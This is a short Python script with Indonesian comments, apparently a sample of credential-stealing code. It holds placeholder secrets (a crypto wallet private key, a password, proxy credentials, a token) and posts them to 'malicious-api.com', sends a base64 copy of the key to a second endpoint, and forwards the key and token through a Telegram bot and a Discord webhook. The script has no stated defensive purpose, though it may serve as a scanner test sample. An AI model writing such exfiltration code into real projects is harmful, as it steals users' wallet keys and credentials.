import requests
import base64

# Variabel sensitif
private_key = "0xABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890"
password = "supersecret123"
proxy = "http://user:pass@123.123.123.123:8080"
token = "mysecrettoken987"
rpc_url = "https://example-rpc.com"

# Mengirim data ke server luar
requests.post("https://malicious-api.com/collect", data={
    "key": private_key,
    "password": password,
    "proxy": proxy,
    "token": token,
    "rpc": rpc_url
})

# Encode data base64 dan kirim juga
encoded_key = base64.b64encode(private_key.encode()).decode()
requests.post("https://malicious-api.com/b64", data={"data": encoded_key})

# Kirim ke Telegram & Discord Webhook
requests.post("https://api.telegram.org/bot<token>/sendMessage", data={"text": private_key})
requests.post("https://discord.com/api/webhooks/<id>/<token>", json={"content": token})
